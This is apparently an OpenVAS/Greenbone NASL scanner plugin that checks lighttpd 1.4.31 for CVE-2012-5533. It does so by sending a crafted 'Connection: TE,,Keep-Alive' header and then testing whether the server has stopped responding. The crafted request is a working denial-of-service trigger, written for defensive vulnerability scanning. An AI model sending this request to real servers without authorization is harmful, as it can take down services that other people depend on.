CPE = "cpe:/a:lighttpd:lighttpd";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802044" );
	script_version( "$Revision: 14117 $" );
	script_bugtraq_id( 56619 );
	script_cve_id( "CVE-2012-5533" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_tag( name: "last_modification", value: "$Date: 2019-03-12 15:02:42 +0100 (Tue, 12 Mar 2019) $" );
	script_tag( name: "creation_date", value: "2012-11-23 10:59:35 +0530 (Fri, 23 Nov 2012)" );
	script_name( "Lighttpd Connection header Denial of Service Vulnerability" );
	script_xref( name: "URL", value: "http://seclists.org/oss-sec/2012/q4/320" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/22902" );
	script_xref( name: "URL", value: "http://www.lighttpd.net/2012/11/21/1-4-32" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2012/Nov/156" );
	script_xref( name: "URL", value: "http://download.lighttpd.net/lighttpd/security/lighttpd_sa_2012_01.txt" );
	script_category( ACT_DENIAL );
	script_copyright( "This script is Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Denial of Service" );
	script_require_ports( "Services/www", 80 );
	script_dependencies( "sw_lighttpd_detect.sc" );
	script_mandatory_keys( "lighttpd/installed" );
	script_tag( name: "impact", value: "Successful exploitation could allow attackers to cause a denial of service
  via crafted Connection header values." );
	script_tag( name: "affected", value: "Lighttpd version 1.4.31" );
	script_tag( name: "insight", value: "The flaw is due to an error when processing certain Connection header values
  leading to enter in an endless loop denying further request processing." );
	script_tag( name: "solution", value: "Upgrade to 1.4.32 or later." );
	script_tag( name: "summary", value: "The host is running Lighttpd HTTP Server and is prone to denial of
  service vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "exploit" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
host = http_host_name( port: port );
dos_req = NASLString( "GET / HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Connection: TE,,Keep-Alive\\r\\n\\r\\n" );
dos_res = http_send_recv( port: port, data: dos_req );
sleep( 2 );
if(http_is_dead( port: port )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

